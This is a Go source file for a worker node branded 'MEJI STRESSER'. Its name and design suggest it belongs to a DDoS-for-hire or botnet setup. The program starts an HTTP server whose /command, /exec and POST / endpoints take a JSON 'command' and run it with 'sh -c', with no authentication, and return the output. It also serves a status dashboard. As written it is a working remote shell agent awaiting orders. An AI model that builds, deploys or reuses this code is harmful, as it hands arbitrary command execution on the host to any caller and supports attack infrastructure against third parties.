package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// CommandRequest defines the structure for incoming execution requests
type CommandRequest struct {
	Command string `json:"command"`
}

// CommandResponse defines the structure for execution results
type CommandResponse struct {
	Status  string `json:"status"`
	Output  string `json:"output,omitempty"`
	Message string `json:"message,omitempty"`
}

var startTime = time.Now()
var nodeName = fmt.Sprintf("node-go-%s-%s", runtime.GOOS, fmt.Sprintf("%x", time.Now().Unix())[4:])

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "5050"
	}

	// Routes
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/command", handleExec)
	http.HandleFunc("/exec", handleExec)
	http.HandleFunc("/status", handleStatus)

	// Middleware for logging
	handler := loggingMiddleware(http.DefaultServeMux)

	fmt.Printf(`
  MEJI STRESSER | GOLANG NODE
  ──────────────────────────────────────────────────
  Node Info:
  Status:    ONLINE
  Port:      %s
  Node Name: %s
  OS:        %s (%s)
  Notice:    Go-based worker for high performance
  ──────────────────────────────────────────────────
  Ready to receive commands...
`, port, nodeName, runtime.GOOS, runtime.GOARCH)

	if err := http.ListenAndServe(":"+port, handler); err != nil {
		fmt.Printf("Error starting server: %v\n", err)
		os.Exit(1)
	}
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		next.ServeHTTP(w, r)
		fmt.Printf("[%s] %s %s from %s (%v)\n", 
			time.Now().Format("15:04:05"), 
			r.Method, 
			r.URL.Path, 
			r.RemoteAddr, 
			time.Since(start),
		)
	})
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		handleExec(w, r)
		return
	}

	uptime := time.Since(startTime).Round(time.Second).String()
	
	// Premium Glassmorphism UI (similar to your Express node)
	const htmlPage = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{.NodeName}} | Meji Go Node</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0b10;
            --card: rgba(20, 22, 30, 0.8);
            --accent: #3b82f6;
            --text: #e0e6ed;
            --text-dim: #94a3b8;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Outfit', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            width: 450px;
            padding: 40px;
            background: var(--card);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 16px;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            color: #60a5fa;
            border-radius: 100px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 24px;
        }
        .status-dot { width: 8px; height: 8px; background: #60a5fa; border-radius: 50%; box-shadow: 0 0 10px #60a5fa; }
        h1 { font-size: 2rem; margin-bottom: 8px; background: linear-gradient(135deg, #fff 0%, #3b82f6 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .node-id { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-dim); margin-bottom: 32px; }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
        .stat-item { padding: 16px; background: rgba(255, 255, 255, 0.03); border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.05); }
        .stat-label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; margin-bottom: 4px; }
        .stat-value { font-size: 1.1rem; font-weight: 600; }
    </style>
</head>
<body>
    <div class="card">
        <div class="status-badge"><div class="status-dot"></div>GO NODE ACTIVE</div>
        <h1>Meji Golang</h1>
        <p class="node-id">{{.NodeName}}</p>
        <div class="stats">
            <div class="stat-item"><p class="stat-label">Platform</p><p class="stat-value">{{.Platform}}</p></div>
            <div class="stat-item"><p class="stat-label">Uptime</p><p class="stat-value">{{.Uptime}}</p></div>
        </div>
    </div>
</body>
</html>`

	t, _ := template.New("index").Parse(htmlPage)
	t.Execute(w, map[string]interface{}{
		"NodeName": nodeName,
		"Uptime":   uptime,
		"Platform": runtime.GOOS + " (" + runtime.GOARCH + ")",
	})
}

func handleExec(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(CommandResponse{Status: "error", Message: "Invalid JSON body"})
		return
	}

	if req.Command == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(CommandResponse{Status: "error", Message: "No command provided"})
		return
	}

	// Execute shell command
	cmd := exec.Command("sh", "-c", req.Command)
	out, err := cmd.CombinedOutput()

	w.Header().Set("Content-Type", "application/json")
	if err != nil {
		json.NewEncoder(w).Encode(CommandResponse{
			Status:  "error",
			Message: err.Error(),
			Output:  string(out),
		})
		return
	}

	json.NewEncoder(w).Encode(CommandResponse{
		Status: "success",
		Output: string(out),
	})
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":   "online",
		"node":     nodeName,
		"platform": runtime.GOOS,
		"arch":     runtime.GOARCH,
		"uptime":   time.Since(startTime).Seconds(),
		"runtime":  runtime.Version(),
	})
}
